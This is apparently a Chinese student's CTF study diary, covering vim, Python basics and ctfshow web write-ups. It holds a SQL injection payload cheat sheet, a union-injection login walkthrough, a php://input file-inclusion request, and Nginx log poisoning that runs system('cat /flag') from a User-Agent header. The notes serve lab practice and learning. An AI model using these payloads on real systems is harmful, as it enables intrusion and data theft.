第二周：
# 2026年10月19日
# 学习内容：学习操作linux，学习pyton，继续解题
## vim模式
## commad mode命令模式-输入冒号--尾行模式--输入o，a，r进入插入模式
## yy 复制内容    p 粘贴内容  dd  删除内容
set nonumber显行号    +/号查找(n,N)
## set ic 全局忽略大小写
## 替换---第几行，第几行--s/需要替换/替换/---加g全局
## u--撤销
vi.vimrc---保存配置信息
ls--显示目录内容 -加-l显示更多信息 -加-a显示隐藏信息
第一题；Web签到题1 WriteUp
考点：网页源代码查看，注释里隐藏flag
解题步骤
1. 打开题目链接
2 查看网页原始源代码
3. 在源码里面找到注释中的Base64编码字符串
4. 对Base64内容解码，得到flag
5. 将flag输入提交框提交，完成解题
## 1. 有没有大量小写+大写+数字，还有 + / ？→ 大概率base64
##### 2. 尾巴有没有 = ？→ 基本实锤base64
###### 3. 如果只有0-9 A-F → 是16进制，不是64
##### 4. 如果全是大写，只有234567数字 → base32
# 2026年10月20日
# 学习内容；SQl
SQL注入完整学习笔记（b站速成）
一、SQL注入核心原理
1. 原理
网站直接把用户输入拼接到SQL语句中执行，没有过滤，用户以构造单引号、注释、SQL语句篡改原有逻辑。
2. 注入本质
闭合原有SQL + 执行自定义SQL + 注释多余代码
所有注入 payload 全部由这三步组成。
3. 注入必备三要素
1. 闭合符（ '   "   )   ')  等）
2. 自定义查询语句
3. 注释符（ #  /  --  ）
二、MySQL最重要固定语法（注入万能套路）
1. 查当前数据库名
sql
database()
2. 查当前数据库所有表名
sql
select table_name from information_schema.tables where table_schema=database()
3.  查某个表的所有字段名
sql
select column_name from information_schema.columns where table_name='flag'
4. 查表数据
sql
select 字段名 from 表名
重点记忆
-  information_schema ：MySQL系统总数据库（存所有库、表、字段信息）
-  table_schema ：数据库名
-  table_name ：表名
-  column_name ：字段名
三、闭合符号大全（第一步必测）
注入第一步永远是 测闭合！
1.  '  单引号（90%题目都是这个，web2就是）
2.  "  双引号
3.  )  括号闭合
4.  ')  单引号+括号
5.  ")  双引号+括号
判断方法：
输入符号 → 报错=闭合正确，无变化=不对
四、注释符（超级高频踩坑点）
 
1. 最稳定（推荐优先用）
web2 仅支持  # ，不支持 --+
2. 标准注释（必须有空格）
sql 
-- 
注意： --+  是浏览器URL编码替代空格，很多靶场不识别
总结 
- 能  #  就用  # 
-  --+  不要无脑用
五、五大注入类型（CTF 全部题型）
## 1. Union 联合查询注入（你刚学会的 web2）
适用场景
页面有回显，可以直接把数据打印出来
固定流程
1.  '  测闭合
2.  order by 数字  测列数
3.  union select 1,2,3  找回显位
4. 查表名 → 查字段 → 查flag
- union 前后列数必须一模一样
- 页面无数据不回显时，必须加  or 1=1 
- 格式： ' or 1=1 union select 1,xxx,3# 
## 2. 报错注入
适用场景
页面不显示数据，只显示报错信息
原理
把查询内容塞进报错函数里，让报错带出数据
常用： updatexml 、 extractvalue 
特点
- 一次只能查32位字符
- 适合无回显、有报错的题
## 3. 布尔盲注（Boolean）
适用场景
无回显、无报错
但页面真假状态不一样（成功页面/失败页面不同）
原理
造真假判断，逐字符猜解flag
sql
' and substr(flag,1,1)='a'#
重点
- SQL下标 从1开始（不是0！）
- 手动极慢，一般用脚本/爆破
## 4. 时间盲注（延时注入）
适用场景
页面真假完全一模一样，看不出任何区别
原理
正确就休眠，错误不休眠
sql
' and if(条件,sleep(3),1)#
## 5. 堆叠注入
原理
用  ;  执行多条SQL
sql
';select flag from flag;#
限制
PHP 多数环境禁止堆叠，出现较少
六、CTF注入标准解题流程（万能流程）
1. 输入  '  测闭合
2.  order by 1/2/3/4  测列数
3.  union select 1,2,3  确认回显位
4. 查询所有表名
5. 查询指定表所有字段
6. 查询最终 flag 数据
八、最简一句话总结所有注入
1. 有回显 → Union注入
2. 有报错无回显 → 报错注入
3. 页面状态不同 → 布尔盲注
4. 页面完全一样 → 时间盲注
5. 能多句执行 → 堆叠注入
# web2 题解 WriteUp
题目：最简单的SQL注入
考点：union联合查询注入
解题步骤
靶场：登录表单，有用户名、密码输入框；payload全部填写在用户名框，密码统一填  1 
步骤1：测试注入闭合符号
payload
- 操作：用户名只输入一个单引号  ' ，密码填1，登录
- 现象：页面报错
- 推导：
后台原始SQL大概是：
sql
select id,username,password from user where username='$username' and password='$password'
我们输入的  '  会替换  $username ，拼接后变成  username='' ' ，单引号多出一个，语法出错，证明是单引号闭合。
步骤2：判断查询字段数量（order by）
payload： ' order by 3# 
- 操作：用户名输入上面语句，密码1，登录
- 现象：页面正常；换成  ' order by 4#  就报错
- 推导：
 order by N  的作用：按照第N列排序。
如果N超过实际存在的列数，SQL报错。
order by 3正常、4报错 → 确定这条查询一共 3个字段。
注释  # ：把后面  ' and password='$password'  注释掉，不再执行。
本靶场不支持  --+  注释，只能用  # 。
步骤3：查询当前数据库里所有表名
payload：
plaintext
' or 1=1 union select 1,table_name,3 from information_schema.tables where table_schema=database()#
- 操作：用户名填入，密码1，登录
- 现象：页面输出表名： user 、 flag 
- 逐段拆解推导：
1.  ' ：闭合原有单引号
2.  or 1=1 ：让前面查询命中数据，页面有回显位置，不然union结果不展示（这是这题关键点）
3.  union select 1,table_name,3 ：联合查询，必须凑够3列，和前面order by测出的数量对齐；1、3是占位，第二个位置放我们想要读出的表名  table_name 
4.  information_schema.tables ：MySQL内置系统表，相当于数据库的台账，存放所有库、表的信息
5.  where table_schema=database() ： database()  代表当前靶场数据库，限定只查本题数据库的表，不查服务器其他库
6.  # ：注释掉后面残余SQL语句
执行结果：拿到两张表： user （账号密码表）、 flag （存放答案的表）
步骤4：查询flag表里的数据，拿到flag
payload：
plaintext
' or 1=1 union select 1,flag,3 from flag#
- 操作：用户名填入，密码1，登录
- 现象：页面输出flag
- 推导：
已经知道存放答案的表名叫  flag ，直接从flag表读取flag字段的值。
 1,flag,3  同样保持3列对齐，第二个位置读出flag内容。
步骤5：提交flag
复制页面返回的flag，填入Submit框提交，题目完成。
知识点总结
1. union联合查询：前后两条select的字段数目必须一样，否则报错。
2. 注入回显问题：部分页面前面查询无数据时，union结果不会显示，需要   or 1=1  保证有回显。
3.  information_schema  是MySQL系统库，是注入里查表、查字段的固定入口。
# BUrp社区版用不了options
# 2026年10月21日
学习内容；Python(b站7天学会python)
Python基础语法笔记
核心思路：少死记，重在理解+动手敲
一、基础入门
1. 注释
python
# 单行注释
"""
多行注释
可以写很多行
"""
- 注释不会被程序执行，用来写说明
2. 输出 print()
python
print("Hello Python")
print(123)
print("数字", 666) # 逗号隔开，自动加空格
3. 变量
- 作用：存数据
- 命名规则：
✅ 字母、数字、下划线；不能数字开头
✅ 区分大小写；不能用关键字（if、for、def等）
✅ 推荐下划线命名： user_name 
python
name = "小明"
age = 18
score = 95.5
is_ok = True
4. 数据类型
-  int ：整数  10 
-  float ：浮点数（小数） 3.14 
-  str ：字符串，引号包裹  "abc" 、 'abc' 
-  bool ：布尔，只有两个值  True / False （首字母大写）
-  list ：列表  [1,2,3] 
-  tuple ：元组  (1,2,3)  不可修改
-  dict ：字典  {"name":"小明"}  键值对
python
type(变量) # 查看类型
5. 输入 input()
input 默认接收的全部是字符串！
python
s = input("请输入：")
num = int(input("输入数字：")) # 转整数
二、运算符
算术运算符
plaintext
+ 加  -减  *乘  /除（结果浮点）
// 整除  %取余  **幂（次方）
示例：
python
print(10 / 3)   # 3.3333
print(10 // 3)  # 3
print(10 % 3)   # 1
print(2 ** 3)   # 8
比较运算符
结果一定是 True / False
plaintext
>  <  >=  <=  == 等于  != 不等于
⚠️ 值是  = ，判断相等是  == ，非常容易写错
逻辑运算符
plaintext
and 并且   or 或者   not 取反
优先级： not > and > or 
三、分支 if 判断（重点！缩进是Python灵魂）
⚠️ Python靠缩进区分代码块，一般4个空格，不能混用tab
语法：
python
if 条件:
    条件成立执行
elif 条件2:
    条件2成立
else:
    都不成立
示例
python
age = 18
if age >= 18:
    print("成年")
else:
    print("未成年")
四、循环
1. while 循环
python
while 条件:
    循环体
一定要有让条件变False的代码，否则死循环
python
i = 1
while i <= 5:
    print(i)
    i += 1
2. for 循环（遍历）
搭配 range()
python
# range(起始,结束,步长)，左闭右开，结束取不到
for i in range(1,6):
    print(i) # 输出1 2 3 4 5
遍历字符串/列表
python
for c in "python":
    print(c)
循环关键字
-  break ：直接跳出整个循环
-  continue ：跳过本次，进入下一次循环
五、字符串 str
python
s = "hello"
s[0]        # 下标取值，h
s[-1]       # 倒数第一个 o
s[0:3]      # 切片，左闭右开 hel
len(s)      # 获取长度
"a" in s    # 判断是否包含
常用方法：
python
s.upper()   # 大写
s.lower()   # 小写
s.strip()   # 去掉首尾空格
s.split(",")# 按逗号分割成列表
六、列表 list []
有序、可修改、允许重复
python
lst = [10,20,30]
lst.append(40)      # 末尾追加
lst.insert(1,99)    # 指定位置插入
lst.remove(20)      # 删除指定元素
lst.pop()           # 删除最后一个并返回
lst[0] = 66         # 修改
七、字典 dict {}
键值对，key唯一
python
d = {"name":"张三","age":18}
print(d["name"])
d["age"] = 19          # 修改/新增
d.get("name")          # 获取，推荐，不会报错
d.keys() / d.values() / d.items()
八、函数 def
封装重复代码
python
def add(a,b):
    return a + b  # return 返回结果
res = add(3,5)
print(res)
- 参数：函数接收的值
- return：返回结果，函数结束；没有return默认返回None
 
✅ 高频坑汇总（必看）
 
1. if/for/while/def 后面必须加冒号  : 
2. 冒号下一行必须缩进，缩进乱直接报错
3.  =  和  ==  不要搞混
4. input拿到的永远是字符串，和数字比较要转换
5. range 右边数字取不到
6. True、False 首字母大写，不是小写
7. 列表可以改，元组不能改
# 2026年10月23日
## 学习内容:伪协议
怎么识别伪协议
笔记：怎么判断一道文件包含题可以用伪协议
先识别题型是【文件包含漏洞】，然后才考虑伪协议；伪协议是漏洞的利用手段，不是题目本身自带“伪协议三个字”。
第一步：怎么看出这题是文件包含（前提）
典型特征，满足任意一条就要往文件包含想：
1. URL里面出现类似参数：
 ?url=xxx  、 ?file=xxx 、 ?path=xxx 、 ?page=xxx 
2. 页面提示：包含、加载、引入某个文件
3. 访问  ?url=index.php ，页面发生变化，说明后端在用  include($_GET['url']) 
4. 访问  ?url=flag.php ，页面空白（因为flag.php里面只是定义flag变量，不会输出）
第二步：为什么判断可以用伪协议？
 include()  这个函数，不止能读取服务器硬盘上的普通文件，还支持读取PHP封装协议流。
也就是
- 正常传：  ?url=flag.php  → 读磁盘文件
- 传伪协议：  ?url=php://input  → 读数据流（不是磁盘文件）
所以只要是  include / require / include_once / require_once  引发的包含漏洞，默认就可以尝试PHP伪协议（能不能成功看配置  allow_url_include ）。
第三步：怎么判断用哪一个伪协议（做题判断流程）
拿到包含题之后，按这个顺序试：
1. 先试普通文件： ?url=flag.php 
-  直接出flag → 完事，不用伪协议
-  空白、看不到flag（大概率flag在php源码里，直接包含只会解析，不输出源码）
→ 换  php://filter （读源码）
2. 看目标：想要执行PHP代码、执行系统命令拿flag
→ 用  php://input （POST提交代码，就是web3这题）
3. 只想读取系统文件（比如 /etc/passwd）
→ 用  file:// 
4. 可以上传压缩包
→ 用 zip://
容易混淆的关键点
1. ❌不是题目写了伪协议，才用伪协议；
✅ 是存在文件包含漏洞，include支持伪协议，我们主动选用伪协议来利用
2. 不是所有包含题都能用全部伪协议：
- 配置  allow_url_include=Off  → php://input、data:// 失效，但是 php://filter、file:// 一般还能用
3. 区分两个路线：
- 读源码 → php://filter
- 执行代码 → php://input
快速判断口诀
参数 file/url/page，传给 include 就是包含；
直接包含不出内容，就要考虑伪协议；
想看源码 filter，想要执行 input。
##  ctfshow web3  题解 此题中c=url
题目名称：更简单的web题
考点：PHP文件包含漏洞 + php://input伪协议绕过正则过滤
靶场链接： https://c1f1bb24-e8af-4146-8d82-a3917bc8d302.challenge.ctf.show/ 
一、题目源码（先看懂逻辑）
php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){ 
        // 正则：在GET参数c里面，不区分大小写查找flag，找到就直接不执行
        include($c); 
        // include：把变量c当成文件路径，读取这个文件并且把里面内容当成PHP代码执行
        echo $flag;
    }
}else{
    highlight_file(__FILE__);
    // 不带参数访问，直接展示当前源码
}
源码核心规则拆解
1. GET传参  c ， c  里面不能出现flag（大小写都不行），否则直接拦截
2. 如果校验通过， include($c) ，把 $c 当成文件包含执行
3. 变量 $flag 在当前页面中，只要成功include，再输出 $flag 就拿到答案
4. ❌ 不能直接写  ?c=flag.php ：因为 c 的值包含flag，被正则拦截
二、选择 payload 的思路（为什么选 php://input）
 php://input  是PHP自带伪协议：作用是读取POST请求原始body数据，把POST里的内容当成文件交给include执
三、详细操作步骤
步骤1：原网页后加?c=php://input
原因：给GET参数c赋值 php://input ，满足两点：
1. 参数c不含flag，绕过  preg_match("/flag/i") 
2. 告诉include：去读取POST请求体，把POST内容当成文件加载
步骤2：把请求发送到Burp Repeater
1. 开启Burp代理抓包，浏览器访问上面链接，抓到GET包
http
GET /?c=php://input HTTP/1.1
Host: c1f1bb24-e8af-4146-8d82-a3917bc8d302.challenge.ctf.show
...
2. 右键 → Send to Repeater（发送到重放模块）
步骤3：修改请求方法为POST，添加请求体
修改数据包：
- 第一行  GET  → 改成  POST 
- 在请求头末尾空一行，添加POST内容：
php
<?php echo $flag; ?>
最终完整包示例：
http
POST /?c=php://input HTTP/1.1
Host: c1f1bb24-e8af-4146-8d82-a3917bc8d302.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
<?php echo $flag; ?>
1. POST请求体就是  php://input  读取的内容
2. include 会读取这个POST数据，当作PHP代码解析执行
3. 执行  echo $flag; ，打印出页面里的flag变量
 注意：不要加  multipart/form-data ，这个格式下php://input失效 
步骤4：点击Send发送请求，查看响应
响应包里面就会直接返回  ctfshow{xxxx}  格式flag。
 原因：include成功执行了我们POST进去的php代码，输出flag。
六、见踩坑说明
1.  错误payload： ?c=flag.php 
原因： c 里面有flag字符串，正则匹配成功，直接拦截，不会include
2.  POST用表单格式提交（form-data）
原因：php://input 在 multipart/form-data 模式下无法读取数据
3.  忘记改POST，直接GET访问  ?c=php://input 
原因：GET没有请求体，php://input读到空，没有代码执行


 #  2026年10月24日
 学习内容：cctshow wb4
 ## 学习笔记：Web服务 Linux默认访问日志路径 
Nginx  /var/log/nginx/access.log  
Nginx错误日志  /var/log/nginx/error.log  
Apache(ubuntu/debian)  /var/log/apache2/access.log
 ## 学习步骤：
1. 进入靶场发现页面：<?php include($_GET['url']);?>与web3一样使用php//:input后报错，被禁用
2. 打开F12查看源代码，进入NETwork(网络)
3. 找到headers(请求头)里的Server(响应码)--在response headers里找到
4. 此时发现server=Nginx  确认目标途径为/var/log/nginx/access.log
5. 进入burp
6.  Burp 抓包，把 User-Agent 改成  <?php system('cat /flag'); ?>  放包（UA 不经过黑名单）
7.  再次访问  ?url=/var/log/nginx/access.log ，PHP 解析日志时执行 UA 里的代码，flag 直接回显
